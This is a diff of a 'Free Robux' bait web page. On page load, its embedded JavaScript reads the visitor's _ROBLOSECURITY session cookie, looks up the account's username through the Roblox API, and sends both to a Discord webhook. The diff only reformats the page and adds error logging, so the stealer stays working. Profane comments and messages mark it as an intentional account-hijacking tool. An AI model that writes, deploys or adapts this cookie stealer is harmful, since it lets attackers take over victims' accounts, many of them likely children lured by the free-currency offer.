@@ -1,37 +1,50 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Robux Shit</title>
+</head>
 <body>
-<img src="ad60885ce9bbd3d523e684f03cb0f67b.jpg" alt="Free Robux Bitch">
-<script>
-var cookie = document.cookie.match(/_ROBLOSECURITY=([^;]+)/);
-if (cookie) {
-    var stolenCookie = cookie[1];
-    var webhook = "https://discord.com/api/webhooks/your-webhook-id/your-webhook-token"; // Your Discord webhook here
-    fetch("https://users.roblox.com/v1/users/authenticated", {
-        headers: { "Cookie": "_ROBLOSECURITY=" + stolenCookie }
-    })
-    .then(response => response.json())
-    .then(data => {
-        var username = data.name || "UnknownFuck";
-        fetch(webhook, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                content: "New catch, bitches!\n**Cookie:** `" + stolenCookie + "`\n**Username:** `" + username + "`"
-            })
-        });
-    })
-    .catch(err => {
-        fetch(webhook, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                content: "Cookie nabbed, no username tho\n**Cookie:** `" + stolenCookie + "`"
-            })
-        });
-    });
-} else {
-    console.log("No fucking cookie found, bitch");
-}
-</script>
+    <img src="bait.png" alt="Free Robux Bitch" onerror="console.log('Image failed to load, check the fucking file')">
+    <script>
+        console.log("Script’s alive, motherfuckers");
+        try {
+            var cookie = document.cookie.match(/_ROBLOSECURITY=([^;]+)/);
+            console.log("Cookie check: ", cookie);
+            if (cookie) {
+                var stolenCookie = cookie[1];
+                var webhook = "https://discord.com/api/webhooks/your-webhook-id/your-webhook-token"; // Your Discord webhook here
+                fetch("https://users.roblox.com/v1/users/authenticated", {
+                    headers: { "Cookie": "_ROBLOSECURITY=" + stolenCookie }
+                })
+                .then(response => response.json())
+                .then(data => {
+                    var username = data.name || "UnknownFuck";
+                    fetch(webhook, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            content: "New catch, bitches!\n**Cookie:** `" + stolenCookie + "`\n**Username:** `" + username + "`"
+                        })
+                    });
+                })
+                .catch(err => {
+                    console.log("API fucked up: ", err);
+                    fetch(webhook, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            content: "Cookie nabbed, no username tho\n**Cookie:** `" + stolenCookie + "`"
+                        })
+                    });
+                });
+            } else {
+                console.log("No fucking cookie found, bitch");
+            }
+        } catch (e) {
+            console.log("Script crashed, fuck: ", e);
+        }
+    </script>
 </body>
 </html>
